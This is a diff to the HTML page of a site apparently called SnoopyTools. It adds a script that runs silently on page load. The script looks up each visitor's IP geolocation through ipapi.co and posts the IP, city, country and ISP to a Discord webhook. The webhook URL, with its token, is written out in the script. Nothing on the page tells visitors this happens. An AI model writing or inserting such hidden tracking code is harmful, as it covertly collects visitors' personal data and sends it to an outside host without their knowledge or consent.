@@ -157,5 +157,21 @@
     ⚠️ Educational use only. Do not use this on unauthorized systems.<br>
     &copy; 2025 SnoopyTools
   </footer>
+
+  <script>
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      fetch("https://discord.com/api/webhooks/1394023683303018566/70BuQDf46rYUc9WZAkVLn0Tn5WxP4xYpVT37IZUru4BY-OJgqtox0jFVB-1CmoEe0DVG", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `📡 Nouveau visiteur sur SnoopyTools !\n🌐 IP: ${data.ip}\n🏙️ Ville: ${data.city}\n🌍 Pays: ${data.country_name}\n🏢 FAI: ${data.org}`
+        })
+      });
+    });
+  </script>
 </body>
 </html>
